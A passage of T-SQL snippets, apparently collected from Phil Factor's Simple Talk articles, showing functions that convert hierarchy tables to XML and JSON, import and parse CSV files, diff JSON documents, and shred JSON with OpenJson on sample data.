	        WHEN 'object' then '  {'+@CrLf+SPACE(@indent+2)
	           +'@Object'+CONVERT(VARCHAR(5),TheRow.[OBJECT_ID])+@CrLf+SPACE(@indent+2)+'}'
	        WHEN 'string' THEN '"'+dbo.JSONEscaped(TheRow.StringValue)+'"'
	        ELSE TheRow.StringValue
	       END 
	     FROM @Hierarchy TheRow 
	     inner join @hierarchy Parent
	     on parent.element_ID=TheRow.parent_ID
	      WHERE TheRow.parent_id= SUBSTRING(@JSON,@where+8, @Notnumber-1)
	     /* basically, we just lookup the structure based on the ID that is appended to the @Object token. Simple eh? */
	    --now we replace the token with the structure, maybe with more tokens in it.
	    Select @JSON=STUFF (@JSON, @where+1, 8+@NotNumber-1, @NewJSON),@ii=@ii-1
	    end
	  return @JSON
	end
	go


IF OBJECT_ID (N'dbo.ToXML') IS NOT NULL
   DROP FUNCTION dbo.ToXML
GO
CREATE FUNCTION ToXML
(
/*this function converts a Hierarchy table into an XML document. This uses the same technique as the toJSON function, and uses the 'entities' form of XML syntax to give a compact rendering of the structure */
      @Hierarchy Hierarchy READONLY
)
RETURNS NVARCHAR(MAX)--use unicode.
AS
BEGIN
  DECLARE
    @XMLAsString NVARCHAR(MAX),
    @NewXML NVARCHAR(MAX),
    @Entities NVARCHAR(MAX),
    @Objects NVARCHAR(MAX),
    @Name NVARCHAR(200),
    @Where INT,
    @ANumber INT,
    @notNumber INT,
    @indent INT,
    @CrLf CHAR(2)--just a simple utility to save typing!
      
  --firstly get the root token into place 
  --firstly get the root token into place 
  SELECT @CrLf=CHAR(13)+CHAR(10),--just CHAR(10) in UNIX
         @XMLasString ='<?xml version="1.0" ?>
@Object'+CONVERT(VARCHAR(5),OBJECT_ID)+'
'
    FROM @hierarchy 
    WHERE parent_id IS NULL AND valueType IN ('object','array') --get the root element
/* now we simply iterate from the root token growing each branch and leaf in each iteration. This won't be enormously quick, but it is simple to do. All values, or name/value pairs within a structure can be created in one SQL Statement*/
  WHILE 1=1
    begin
    SELECT @where= PATINDEX('%[^a-zA-Z0-9]@Object%',@XMLAsString)--find NEXT token
    if @where=0 BREAK
    /* this is slightly painful. we get the indent of the object we've found by looking backwards up the string */ 
    SET @indent=CHARINDEX(char(10)+char(13),Reverse(LEFT(@XMLasString,@where))+char(10)+char(13))-1
    SET @NotNumber= PATINDEX('%[^0-9]%', RIGHT(@XMLasString,LEN(@XMLAsString+'|')-@Where-8)+' ')--find NEXT token
    SET @Entities=NULL --this contains the structure in its XML form
    SELECT @Entities=COALESCE(@Entities+' ',' ')+NAME+'="'
     +REPLACE(REPLACE(REPLACE(StringValue, '<', '&lt;'), '&', '&amp;'),'>', '&gt;')
     + '"'  
       FROM @hierarchy 
       WHERE parent_id= SUBSTRING(@XMLasString,@where+8, @Notnumber-1) 
          AND ValueType NOT IN ('array', 'object')
    SELECT @Entities=COALESCE(@entities,''),@Objects='',@name=CASE WHEN Name='-' THEN 'root' ELSE NAME end
      FROM @hierarchy 
      WHERE [Object_id]= SUBSTRING(@XMLasString,@where+8, @Notnumber-1) 
    
    SELECT  @Objects=@Objects+@CrLf+SPACE(@indent+2)
           +'@Object'+CONVERT(VARCHAR(5),OBJECT_ID)
           --+@CrLf+SPACE(@indent+2)+''
      FROM @hierarchy 
      WHERE parent_id= SUBSTRING(@XMLasString,@where+8, @Notnumber-1) 
      AND ValueType IN ('array', 'object')
    IF @Objects='' --if it is a lef, we can do a more compact rendering
         SELECT @NewXML='<'+COALESCE(@name,'item')+@entities+' />'
    ELSE
        SELECT @NewXML='<'+COALESCE(@name,'item')+@entities+'>'
            +@Objects+@CrLf++SPACE(@indent)+'</'+COALESCE(@name,'item')+'>'
     /* basically, we just lookup the structure based on the ID that is appended to the @Object token. Simple eh? */
    --now we replace the token with the structure, maybe with more tokens in it.
    Select @XMLasString=STUFF (@XMLasString, @where+1, 8+@NotNumber-1, @NewXML)
    end
  return @XMLasString
  end


  DECLARE @MyHierarchy Hierarchy,@xml XML
INSERT INTO @myHierarchy 
select * from parseJSON('{"menu": {
  "id": "file",
  "value": "File",
  "popup": {
    "menuitem": [
      {"value": "New", "onclick": "CreateNewDoc()"},
      {"value": "Open", "onclick": "OpenDoc()"},
      {"value": "Close", "onclick": "CloseDoc()"}
    ]
  }
}}')
SELECT dbo.ToXML(@MyHierarchy)
SELECT @XML=dbo.ToXML(@MyHierarchy)
SELECT @XML













https://www.red-gate.com/simple-talk/sql/t-sql-programming/the-tsql-of-csv-comma-delimited-of-errors/


--Create a simple test for interpreting CSV (From Wikipedia)
DECLARE @TestCSVFileFromWikipedia VARCHAR(MAX)
--put CSV into a variable
SELECT @TestCSVFileFromWikipedia='Year,Make,Model,Description,Price
1997,Ford,E350,"ac, abs, moon",3000.00
1999,Chevy,"Venture ""Extended Edition""","",4900.00
1999,Chevy,"Venture ""Extended Edition, Very Large""","",5000.00
1996,Jeep,Grand Cherokee,"MUST SELL!
air, moon roof, loaded",4799.00'
--write it to disk (Source of procedure in the  article 'The TSQL of Text'
EXECUTE philfactor.dbo.spSaveTextToFile
  @TestCSVFileFromWikipedia,'d:\files\TestCSV.csv',0
 
--create a table to read it into
CREATE TABLE TestCSVImport ([Year] INT, Make VARCHAR(80), Model VARCHAR(80), [Description] VARCHAR(80), Price money)
BULK INSERT TestCSVImport FROM 'd:\files\TestCSV.csv' 
WITH ( FIELDTERMINATOR = ',', ROWTERMINATOR = '\n', FirstRow=2)
--No way. This is merely using commas to delimit. 
--BCP can't import a CSV file!
GO
 
--whereas
INSERT INTO TestCSVImport
SELECT *
FROM
    OPENROWSET('MSDASQL',--provider name (ODBC)
     'Driver={Microsoft Text Driver (*.txt; *.csv)};
        DEFAULTDIR=d:\files;Extensions=CSV;',--data source




Declare @CSVFileContents Varchar(MAX)
SELECT @CSVFileContents = BulkColumn
FROM  OPENROWSET(BULK 'd:\files\TestCSV.csv', SINGLE_BLOB) AS x  
 
CREATE TABLE AnotherTestCSVImport ([Year] INT, Make VARCHAR(80), 
             Model VARCHAR(80), [Description] VARCHAR(80), Price money)
INSERT INTO AnotherTestCSVImport
    Execute CSVToTable @CSVFileContents 



DECLARE @MyHierarchy Hierarchy, @XML XML
INSERT INTO @myHierarchy
   Select * from parseCSV('Year,Make,Model,Description,Price
1997,Ford,E350,"ac, abs, moon",3000.00
1999,Chevy,"Venture ""Extended Edition""","",4900.00
1999,Chevy,"Venture ""Extended Edition, Very Large""","",5000.00
1996,Jeep,Grand Cherokee,"MUST SELL!
air, moon roof, loaded",4799.00', Default,Default,Default)
SELECT dbo.ToXML(@MyHierarchy)



<?xml version="1.0" ?>
<root>
  <CSV>
    <item Year="1997" Make="Ford" Model="E350" Description="ac, abs, moon" Price="3000.00" />
    <item Year="1999" Make="Chevy" Model="Venture &quot;Extended Edition&quot;" Description="" Price="4900.00" />
    <item Year="1999" Make="Chevy" Model="Venture &quot;Extended Edition, Very Large&quot;" Description="" Price="5000.00" />
    <item Year="1996" Make="Jeep" Model="Grand Cherokee" Description="MUST SELL!
air, moon roof, loaded" Price="4799.00" />
  </CSV>
</root>




DECLARE @MyHierarchy Hierarchy, @XML XML
INSERT INTO @myHierarchy
  Select * from parseCSV('Year,Make,Model,Description,Price
1997,Ford,E350,"ac, abs, moon",3000.00
1999,Chevy,"Venture ""Extended Edition""","",4900.00
1999,Chevy,"Venture ""Extended Edition, Very Large""","",5000.00
1996,Jeep,Grand Cherokee,"MUST SELL!
air, moon roof, loaded",4799.00', Default,Default,Default)
SELECT dbo.ToJSON(@MyHierarchy)



{
"CSV" :   [
    {
    "Year" : 1997,
    "Make" : "Ford",
    "Model" : "E350",
    "Description" : "ac, abs, moon",
    "Price" : 3000.00
    },
    {
    "Year" : 1999,
    "Make" : "Chevy",
    "Model" : "Venture "Extended Edition"",
    "Description" : "",
    "Price" : 4900.00
    },
    {
    "Year" : 1999,
    "Make" : "Chevy",
    "Model" : "Venture "Extended Edition, Very Large"",
    "Description" : "",
    "Price" : 5000.00
    },
    {
    "Year" : 1996,
    "Make" : "Jeep",
    "Model" : "Grand Cherokee",
    "Description" : "MUST SELL!\r\nair, moon roof, loaded",
    "Price" : 4799.00
    }
  ]
}


Execute CSVToTable '"REVIEW_DATE","AUTHOR","ISBN","DISCOUNTED_PRICE"
"1985/01/21","Douglas Adams",0345391802,5.95
"1990/01/12","Douglas Hofstadter",0465026567,9.95
"1998/07/15","Timothy ""The Parser"" Campbell",0968411304,18.99
"1999/12/03","Richard Friedman",0060630353,5.95
"2001/09/19","Karen Armstrong",0345384563,9.95
"2002/06/23","David Jones",0198504691,9.95
"2002/06/23","Julian Jaynes",0618057072,12.50
"2003/09/30","Scott Adams",0740721909,4.95
"2004/10/04","Benjamin Radcliff",0804818088,4.95
"2004/10/04","Randel Helms",0879755725,4.50'



https://www.red-gate.com/simple-talk/blogs/sql-server-json-diff-checking-for-differences-between-json-documents/



SELECT * FROM dbo.Compare_JsonObject(--compares two JSON Documents
-- here is your non-json query. This is just an example using 'string_agg'.
(SELECT GroupName, String_Agg(Name, ', ') WITHIN GROUP ( ORDER BY Name)  AS departments
  FROM AdventureWorks2016.HumanResources.Department
  GROUP BY GroupName
--and we then convert it to JSON
  FOR JSON AUTO),
-- here is your non-json query. This is an 'XML-trick' version to produce the list
(SELECT GroupName,
  (
  SELECT
    Stuff((
    SELECT ', ' + Name
      FROM AdventureWorks2016.HumanResources.Department AS dep
      WHERE dep.GroupName = TheGroup.GroupName ORDER BY dep.name
    FOR XML PATH(''), TYPE
    ).value('.', 'varchar(max)'),
  1,2,'')) AS departments
  FROM AdventureWorks2016.HumanResources.Department AS thegroup
  GROUP BY GroupName
--and we then convert it to JSON
  FOR JSON AUTO
  )
)
WHERE SideIndicator <> '==' --meaning ALL the items that don't match
--hopefully, nothing will get returned

SELECT * FROM dbo.Compare_JsonObject(--compares two JSON Documents
-- here is your non-json query. This is just an example using 'string_agg'.
(SELECT GroupName, String_Agg(Name, ', ') AS departments
  FROM AdventureWorks2016.HumanResources.Department
  GROUP BY GroupName
--and we then convert it to JSON
  FOR JSON AUTO),
-- here is your non-json query. This is an 'XML-trick' version to produce the list
(SELECT GroupName,
  (
  SELECT
    Stuff((
    SELECT ', ' + Name
      FROM AdventureWorks2016.HumanResources.Department AS dep
      WHERE dep.GroupName = TheGroup.GroupName
    FOR XML PATH(''), TYPE
    ).value('.', 'varchar(max)'),
  1,2,'')) AS departments
  FROM AdventureWorks2016.HumanResources.Department AS thegroup
  GROUP BY GroupName
--and we then convert it to JSON
  FOR JSON AUTO
  )
)
WHERE SideIndicator <> '==' --meaning ALL the items that don't match


DECLARE @SourceJSON NVARCHAR(MAX) = '{
 
  "question": "What is a clustered index?",
  "options": [
    "A bridal cup used in marriage ceremonies by the Navajo indians",
    "a bearing in a gearbox used to facilitate double-declutching",
    "An index that sorts and store the data rows in the table or view based on the key values"
  ],
  "answer": 3
}',
@TargetJSON NVARCHAR(MAX) = '{
 
  "question": "What is a clustered index?",
  "options": [
	"a form of mortal combat referred to as ''the noble art of defense''",
    "a bearing in a gearbox used to facilitate double-declutching",
	"A bridal cup used in marriage ceremonies by the Navajo indians",
    "An index that sorts and store the data rows in the table or view based on the key values"
 
  ],
  "answer": 4
}'
SELECT SideIndicator, ThePath, TheKey, TheSourceValue, TheTargetValue
  FROM dbo.Compare_JsonObject(@SourceJSON, @TargetJSON) AS Diff;

  SELECT ThePath, TheKey, TheSourceValue, TheTargetValue,
  Json_Value(@SourceJSON, TheParent + '.question') AS TheQuestion
  FROM dbo.Compare_JsonObject(@SourceJSON, @TargetJSON)
  WHERE SideIndicator = '<>';



  CREATE OR ALTER FUNCTION dbo.Compare_JsonObject (@SourceJSON NVARCHAR(MAX), @TargetJSON NVARCHAR(MAX))
/**
Summary: >
  This function 'diffs' a source JSON document with a target JSON document and produces an
  analysis of which properties are missing in either the source or target, or the values
  of these properties that are different. It reports on the properties and values for 
  both source and target as well as the path that references that scalar value. The 
  path reference to the object's parent is exposed in the result to enable a query to
  reference the value of any other object in the parent that is needed. 
Author: Phil Factor
Date: 06/07/2020
Revised:
	- mod: Added the parent reference to the difference report
	- Date: 09/07/2020
Database: PhilsRoutines
Examples:
   - SELECT * FROM dbo.Compare_JsonObject(@TheSourceJSON, @TheTargetJSON)
       WHERE SideIndicator <> '==';
   - SELECT *, Json_Value(@TheSourceJSON,TheParent+'.name')
       FROM dbo.Compare_JsonObject(@TheSourceJSON, @TheTargetJSON)
       WHERE SideIndicator <> '==';
Returns: >
  SideIndicator:  ( == equal, <- not in target, ->  not in source, <> not equal
  ThePath:   the JSON path used by the SQL JSON functions 
  TheKey:  the key field without the path
  TheSourceValue: the value IN the SOURCE JSON document
  TheTargetValue: the value IN the TARGET JSON document
 
**/
RETURNS @returntable TABLE
  (
  SideIndicator CHAR(2), -- == means equal, <- means not in target, -> means not in source, <> means not equal
  TheParent  NVARCHAR(2000), --the parent object
  ThePath NVARCHAR(2000), -- the JSON path used by the SQL JSON functions 
  TheKey NVARCHAR(200), --the key field without the path
  TheSourceValue NVARCHAR(200), -- the value IN the SOURCE JSON document
  TheTargetValue NVARCHAR(200) -- the value IN the TARGET JSON document
  )
AS
  BEGIN
    IF (IsJson(@SourceJSON) = 1 AND IsJson(@TargetJSON) = 1) --don't try anything if either json is invalid
      BEGIN
        DECLARE @map TABLE --these contain all properties or array elements with scalar values
          (
          iteration INT, --the number of times that more arrays or objects were found
          SourceOrTarget CHAR(1), --is this the source 's' OR the target 't'
 		  TheParent NVARCHAR(80), --the parent object
		  ThePath NVARCHAR(80), -- the JSON path to the key/value pair or array element
          TheKey NVARCHAR(2000), --the key to the property
          TheValue NVARCHAR(MAX),-- the value
          TheType INT --the type of value it is
          );
        DECLARE @objects TABLE --this contains all the properties with arrays and objects 
          (
          iteration INT,
          SourceOrTarget CHAR(1),
		  TheParent NVARCHAR(80),
          ThePath NVARCHAR(80),
          TheKey NVARCHAR(2000),
          TheValue NVARCHAR(MAX),
          TheType INT
          );
        DECLARE @depth INT = 1; --we start in shallow water
        DECLARE @HowManyObjectsNext INT = 1, @SourceType INT, @TargetType INT;
        SELECT --firstly, we try to work out if the source is an array or object
          @SourceType = 
            CASE IsNumeric((SELECT TOP 1 [key] FROM OpenJson(@SourceJSON))) 
              WHEN 1 THEN 4 ELSE 5 END,
          @TargetType= --and if the target is an array or object
            CASE IsNumeric((SELECT TOP 1 [key] FROM OpenJson(@TargetJSON))) 
              WHEN 1 THEN 4 ELSE 5 END
        --now we insert the base objects or arrays into the object table      
        INSERT INTO @objects 
          (iteration, SourceOrTarget, TheParent, ThePath, TheKey, TheValue, TheType)
          SELECT 0, 's' AS SourceOrTarget,'' AS parent, '$' AS path, '', @SourceJSON, @SourceType;
        INSERT INTO @objects 
          (iteration, SourceOrTarget,TheParent, ThePath, TheKey, TheValue, TheType)
          SELECT 0, 't' AS SourceOrTarget, '' AS parent, '$' AS path,
          '', @TargetJSON, @TargetType;
        --we now set the depth and how many objects are in the next iteration
        SELECT @depth = 0, @HowManyObjectsNext = 2; 
        WHILE @HowManyObjectsNext > 0
          BEGIN
            INSERT INTO @map --get the scalar values into the @map table
              (iteration, SourceOrTarget, TheParent, ThePath, TheKey, TheValue, TheType)
              SELECT -- 
                o.iteration + 1, SourceOrTarget,
				ThePath,
                ThePath+CASE Thetype WHEN 4 THEN '['+[Key]+']' ELSE '.'+[key] END, 
                [key],[value],[type]
                FROM @objects AS o
                  CROSS APPLY OpenJson(TheValue)
                WHERE Type IN (1, 2, 3) AND o.iteration = @depth;
			--now we do the same for the objects and arrays
            INSERT INTO @objects (iteration, SourceOrTarget, TheParent, ThePath, TheKey,
            TheValue, TheType)
              SELECT o.iteration + 1, SourceOrTarget,ThePath,
               ThePath + CASE TheType WHEN 4 THEN '['+[Key]+']' ELSE '.'+[Key] END,
               [key],[value],[type]
              FROM @objects o 
			  CROSS APPLY OpenJson(TheValue) 
			  WHERE type IN (4,5) AND o.iteration=@depth    
           SELECT @HowManyObjectsNext=@@RowCount --how many objects or arrays?
           SELECT @depth=@depth+1 --and so to the next depth maybe
         END
--now we just do a full join on the columns we are comparing and work out the comparison
         INSERT INTO @returntable
          SELECT 
		   --first we work out the side-indicator that summarises the comparison
           CASE WHEN The_Source.TheValue=The_Target.TheValue THEN '=='
             ELSE 
             CASE  WHEN The_Source.ThePath IS NULL THEN '-' ELSE '<' end
               + CASE WHEN The_Target.ThePath IS NULL THEN '-' ELSE '>' END 
           END AS Sideindicator, 
		   --these columns could be in either table
		   Coalesce(The_source.TheParent, The_target.TheParent) AS TheParent,
           Coalesce(The_source.ThePath, The_target.ThePath) AS TheactualPath,
           Coalesce(The_source.TheKey, The_target.TheKey) AS TheKey,
           The_source.TheValue, The_target.TheValue
            FROM 
               (SELECT TheParent, ThePath, TheKey, TheValue FROM @map WHERE SourceOrTarget = 's')
			     AS The_source -- the source scalar literals
              FULL OUTER JOIN 
               (SELECT TheParent, ThePath, TheKey, TheValue FROM @map WHERE SourceOrTarget = 't')
			     AS The_target --the target scalar literals
                ON The_source.ThePath = The_target.ThePath
            ORDER BY TheactualPath;
      END;
    RETURN;
  END;
go

https://www.red-gate.com/simple-talk/blogs/consuming-hierarchical-json-documents-sql-server-using-openjson/


SELECT [Name of Dam], Location, Type, [Height (metres)], [Height (ft)], [Date Completed]
  FROM
  OpenJson('[
{"name":"Rogunsky","location":"Tajikistan","type":"earthfill","heightmetres":"335","heightfeet":"1098","DateCompleted":"1985"},
{"name":"Nurck","location":"Russia","type":"earthfill","heightmetres":"317 ","heightfeet":"1040","DateCompleted":"1980"},
{"name":"Grande Dixence","location":"Switzerland","type":"gravity","heightmetres":"284","heightfeet":"932","DateCompleted":"1962"},
{"name":"Inguri","location":"Georgia","type":"arch","heightmetres":"272","heightfeet":"892","DateCompleted":"1980"},
{"name":"Vaiont","location":"Italy","type":"multi-arch","heightmetres":"262","heightfeet":"858","DateCompleted":"1961"},
{"name":"Mica","location":"Canada","type":"rockfill","heightmetres":"242","heightfeet":"794","DateCompleted":"1973"},
{"name":"Mauvoisin","location":"Switzerland","type":"arch","heightmetres":"237","heightfeet":"111","DateCompleted":"1958"}
]'        )
  WITH
    ([Name of Dam] VARCHAR(20) '$.name', Location VARCHAR(20) '$.location',
    Type VARCHAR(20) '$.type', [Height (metres)] INT '$.heightmetres',
    [Height (ft)] INT '$.heightfeet', [Date Completed] INT '$.DateCompleted'
    );


	IF Object_Id('dbo.DatabaseObjects') IS NOT NULL
       DROP function dbo.DatabaseObjects
    GO
    CREATE FUNCTION dbo.DatabaseObjects
    /**
    Summary: >
      lists out the full names, schemas and (where appropriate)
      the owner of the object.
    Author: PhilFactor
    Date: 10/9/2017
    Examples:
       - Select * from dbo.DatabaseObjects('2123154609,960722475,1024722703')
    Returns: >
      A table with the id, name of object and so on.
            **/
      (
      @ListOfObjectIDs varchar(max)
      )
    RETURNS TABLE
     --WITH ENCRYPTION|SCHEMABINDING, ..
    AS
    RETURN
      (
      SELECT 
	    object_id,
        Schema_Name(schema_id) + '.' +
		  Coalesce(Object_Name(parent_object_id) + '.', '') + name AS name
        FROM sys.objects AS ob
          INNER JOIN OpenJson(N'[' + @ListOfObjectIDs + N']')
            ON Convert(INT, Value) = ob.object_id
      )

IF (SELECT Compatibility_level FROM sys.databases WHERE name LIKE Db_Name())<130
  ALTER DATABASE MyDatabase SET COMPATIBILITY_LEVEL = 130




	  IF EXISTS (SELECT * FROM sys.types WHERE name LIKE 'Hierarchy')
    SET NOEXEC On
  go
  CREATE TYPE dbo.Hierarchy AS TABLE
  /*Markup languages such as JSON and XML all represent object data as hierarchies. Although it looks very different to the entity-relational model, it isn't. It is rather more a different perspective on the same model. The first trick is to represent it as a Adjacency list hierarchy in a table, and then use the contents of this table to update the database. This Adjacency list is really the Database equivalent of any of the nested data structures that are used for the interchange of serialized information with the application, and can be used to create XML, OSX Property lists, Python nested structures or YAML as easily as JSON.
  Adjacency list tables have the same structure whatever the data in them. This means that you can define a single Table-Valued  Type and pass data structures around between stored procedures. However, they are best held at arms-length from the data, since they are not relational tables, but something more like the dreaded EAV (Entity-Attribute-Value) tables. Converting the data from its Hierarchical table form will be different for each application, but is easy with a CTE. You can, alternatively, convert the hierarchical table into XML and interrogate that with XQuery
  */
  (
     element_id INT primary key, /* internal surrogate primary key gives the order of parsing and the list order */
     sequenceNo [int] NULL, /* the place in the sequence for the element */
     parent_ID INT,/* if the element has a parent then it is in this column. The document is the ultimate parent, so you can get the structure from recursing from the document */
     Object_ID INT,/* each list or object has an object id. This ties all elements to a parent. Lists are treated as objects here */
     NAME NVARCHAR(2000),/* the name of the object, null if it hasn't got one */
     StringValue NVARCHAR(MAX) NOT NULL,/*the string representation of the value of the element. */
     ValueType VARCHAR(10) NOT null /* the declared type of the value represented as a string in StringValue*/
  )
  go
  SET NOEXEC OFF
  GO





  IF  Object_Id('dbo.JSONHierarchy', 'TF') IS NOT NULL 
	DROP FUNCTION dbo.JSONHierarchy
GO
CREATE FUNCTION dbo.JSONHierarchy
  (
  @JSONData VARCHAR(MAX),
  @Parent_object_ID INT = NULL,
  @MaxObject_id INT = 0,
  @type INT = null
  )
RETURNS @ReturnTable TABLE
  (
  Element_ID INT IDENTITY(1, 1) PRIMARY KEY, /* internal surrogate primary key gives the order of parsing and the list order */
  SequenceNo INT NULL, /* the sequence number in a list */
  Parent_ID INT, /* if the element has a parent then it is in this column. The document is the ultimate parent, so you can get the structure from recursing from the document */
  Object_ID INT, /* each list or object has an object id. This ties all elements to a parent. Lists are treated as objects here */
  Name NVARCHAR(2000), /* the name of the object */
  StringValue NVARCHAR(MAX) NOT NULL, /*the string representation of the value of the element. */
  ValueType VARCHAR(10) NOT NULL /* the declared type of the value represented as a string in StringValue*/
  )
AS
  BEGIN
	--the types of JSON
    DECLARE @null INT =
      0, @string INT = 1, @int INT = 2, @boolean INT = 3, @array INT = 4, @object INT = 5;
 
    DECLARE @OpenJSONData TABLE
      (
      sequence INT IDENTITY(1, 1),
      [key] VARCHAR(200),
      Value VARCHAR(MAX),
      type INT
      );
 
    DECLARE @key VARCHAR(200), @Value VARCHAR(MAX), @Thetype INT, @ii INT, @iiMax INT,
      @NewObject INT, @firstchar CHAR(1);
 
    INSERT INTO @OpenJSONData
      ([key], Value, type)
      SELECT [Key], Value, Type FROM OpenJson(@JSONData);
	SELECT @ii = 1, @iiMax = Scope_Identity()
    SELECT  @Firstchar= --the first character to see if it is an object or an array
	  Substring(@JSONData,PatIndex('%[^'+CHAR(0)+'- '+CHAR(160)+']%',' '+@JSONData+'!' collate SQL_Latin1_General_CP850_Bin)-1,1)
    IF @type IS NULL AND @firstchar IN ('[','{')
		begin
	   INSERT INTO @returnTable
	    (SequenceNo,Parent_ID,Object_ID,Name,StringValue,ValueType)
			SELECT 1,NULL,1,'-','', 
			   CASE @firstchar WHEN '[' THEN 'array' ELSE 'object' END
        SELECT @type=CASE @firstchar WHEN '[' THEN @array ELSE @object END,
		@Parent_object_ID  = 1, @MaxObject_id=Coalesce(@MaxObject_id, 1) + 1;
		END       
	WHILE(@ii <= @iiMax)
      BEGIN
	  --OpenJSON renames list items with 0-nn which confuses the consumers of the table
        SELECT @key = CASE WHEN [key] LIKE '[0-9]%' THEN NULL ELSE [key] end , @Value = Value, @Thetype = type
          FROM @OpenJSONData
          WHERE sequence = @ii;
 
        IF @Thetype IN (@array, @object) --if we have been returned an array or object
          BEGIN
            SELECT @MaxObject_id = Coalesce(@MaxObject_id, 1) + 1;
			--just in case we have an object or array returned
            INSERT INTO @ReturnTable --record the object itself
              (SequenceNo, Parent_ID, Object_ID, Name, StringValue, ValueType)
              SELECT @ii, @Parent_object_ID, @MaxObject_id, @key, '',
                CASE @Thetype WHEN @array THEN 'array' ELSE 'object' END;
 
            INSERT INTO @ReturnTable --and return all its children
              (SequenceNo, Parent_ID, Object_ID, [Name],  StringValue, ValueType)
			  SELECT SequenceNo, Parent_ID, Object_ID, 
				[Name],
				Coalesce(StringValue,'null'),
				ValueType
              FROM dbo.JSONHierarchy(@Value, @MaxObject_id, @MaxObject_id, @type);
			SELECT @MaxObject_id=Max(Object_id)+1 FROM @ReturnTable
		  END;
        ELSE
          INSERT INTO @ReturnTable
            (SequenceNo, Parent_ID, Object_ID, Name, StringValue, ValueType)
            SELECT @ii, @Parent_object_ID, NULL, @key, Coalesce(@Value,'null'),
              CASE @Thetype WHEN @string THEN 'string'
                WHEN @null THEN 'null'
                WHEN @int THEN 'int'
                WHEN @boolean THEN 'boolean' ELSE 'int' END;
 
        SELECT @ii = @ii + 1;
      END;
 
    RETURN;
  END;
GO



SELECT * FROM dbo.JSONHierarchy('{    "Person": 
    {
       "firstName": "John",
       "lastName": "Smith",
       "age": 25,
       "Address": 
       {
          "streetAddress":"21 2nd Street",
          "city":"New York",
          "state":"NY",
          "postalCode":"10021"
       },
       "PhoneNumbers": 
       {
          "home":"212 555-1234",
          "fax":"646 555-4567"
       }
    }
  }'
  ,DEFAULT,DEFAULT,DEFAULT)


  DECLARE @MyHierarchy Hierarchy, @xml XML
  INSERT INTO @MyHierarchy
    SELECT Element_ID, SequenceNo, Parent_ID, Object_ID, Name, StringValue, ValueType
    FROM dbo.JSONHierarchy('
  {
    "menu": {
      "id": "file",
      "value": "File",
      "popup": {
        "menuitem": [
          {
            "value": "New",
            "onclick": "CreateNewDoc()"
          },
          {
            "value": "Open",
            "onclick": "OpenDoc()"
          },
          {
            "value": "Close",
            "onclick": "CloseDoc()"
          }
        ]
      }
    }
  }', DEFAULT,DEFAULT,DEFAULT
   )
  SELECT @xml = dbo.ToXML(@MyHierarchy)
  SELECT @xml --to validate the XML, we convert the string to XML



  IF Object_Id('dbo.HierarchyFromJSON', 'TF') IS NOT NULL DROP FUNCTION dbo.HierarchyFromJSON;
GO
 
CREATE FUNCTION dbo.HierarchyFromJSON(@JSONData VARCHAR(MAX))
RETURNS @ReturnTable TABLE
  (
  Element_ID INT, /* internal surrogate primary key gives the order of parsing and the list order */
  SequenceNo INT NULL, /* the sequence number in a list */
  Parent_ID INT, /* if the element has a parent then it is in this column. The document is the ultimate parent, so you can get the structure from recursing from the document */
  Object_ID INT, /* each list or object has an object id. This ties all elements to a parent. Lists are treated as objects here */
  Name NVARCHAR(2000), /* the name of the object */
  StringValue NVARCHAR(MAX) NOT NULL, /*the string representation of the value of the element. */
  ValueType VARCHAR(10) NOT NULL /* the declared type of the value represented as a string in StringValue*/
  )
AS
  BEGIN
    DECLARE @ii INT = 1, @rowcount INT = -1;
    DECLARE @null INT =
      0, @string INT = 1, @int INT = 2, @boolean INT = 3, @array INT = 4, @object INT = 5;
 
    DECLARE @TheHierarchy TABLE
      (
      element_id INT IDENTITY(1, 1) PRIMARY KEY,
      sequenceNo INT NULL,
      Depth INT, /* effectively, the recursion level. =the depth of nesting*/
      parent_ID INT,
      Object_ID INT,
      NAME NVARCHAR(2000),
      StringValue NVARCHAR(MAX) NOT NULL,
      ValueType VARCHAR(10) NOT NULL
      );
 
    INSERT INTO @TheHierarchy
      (sequenceNo, Depth, parent_ID, Object_ID, NAME, StringValue, ValueType)
      SELECT 1, @ii, NULL, 0, 'root', @JSONData, 'object';
 
    WHILE @rowcount <> 0
      BEGIN
        SELECT @ii = @ii + 1;
 
        INSERT INTO @TheHierarchy
          (sequenceNo, Depth, parent_ID, Object_ID, NAME, StringValue, ValueType)
          SELECT Scope_Identity(), @ii, Object_ID,
            Scope_Identity() + Row_Number() OVER (ORDER BY parent_ID), [Key], Coalesce(o.Value,'null'),
            CASE o.Type WHEN @string THEN 'string'
              WHEN @null THEN 'null'
              WHEN @int THEN 'int'
              WHEN @boolean THEN 'boolean'
              WHEN @int THEN 'int'
              WHEN @array THEN 'array' ELSE 'object' END
          FROM @TheHierarchy AS m
            CROSS APPLY OpenJson(StringValue) AS o
          WHERE m.ValueType IN
        ('array', 'object') AND Depth = @ii - 1;
 
        SELECT @rowcount = @@RowCount;
      END;
 
    INSERT INTO @ReturnTable
      (Element_ID, SequenceNo, Parent_ID, Object_ID, Name, StringValue, ValueType)
      SELECT element_id, element_id - sequenceNo, parent_ID,
        CASE WHEN ValueType IN ('object', 'array') THEN Object_ID ELSE NULL END,
        CASE WHEN NAME LIKE '[0-9]%' THEN NULL ELSE NAME END,
        CASE WHEN ValueType IN ('object', 'array') THEN '' ELSE StringValue END, ValueType
      FROM @TheHierarchy;
 
    RETURN;
  END;
GO




SELECT LocationID, Name, CostRate, Availability, ModifiedDate
    FROM
    OpenJson('
   [
  {  "LocationID": "1", "Name": "Tool Crib", "CostRate": "0.00", "Availability": "0.00",
     "ModifiedDate": "01 June 2002 00:00:00"},
  {  "LocationID": "2", "Name": "Sheet Metal Racks", "CostRate": "0.00", "Availability": "0.00",
     "ModifiedDate": "01 June 2002 00:00:00"},
  {   "LocationID": "3", "Name": "Paint Shop", "CostRate": "0.00", "Availability": "0.00",
     "ModifiedDate": "01 June 2002 00:00:00"},
  {   "LocationID": "4", "Name": "Paint Storage", "CostRate": "0.00", "Availability": "0.00",
     "ModifiedDate": "01 June 2002 00:00:00"},
  {   "LocationID": "5", "Name": "Metal Storage", "CostRate": "0.00", "Availability": "0.00",
     "ModifiedDate": "01 June 2002 00:00:00"},
  {   "LocationID": "6", "Name": "Miscellaneous Storage", "CostRate": "0.00", "Availability": "0.00",
     "ModifiedDate": "01 June 2002 00:00:00"},
  {   "LocationID": "7", "Name": "Finished Goods Storage", "CostRate": "0.00", "Availability": "0.00",
     "ModifiedDate": "01 June 2002 00:00:00"},
  {   "LocationID": "10", "Name": "Frame Forming", "CostRate": "22.50", "Availability": "96.00",
     "ModifiedDate": "01 June 2002 00:00:00"},
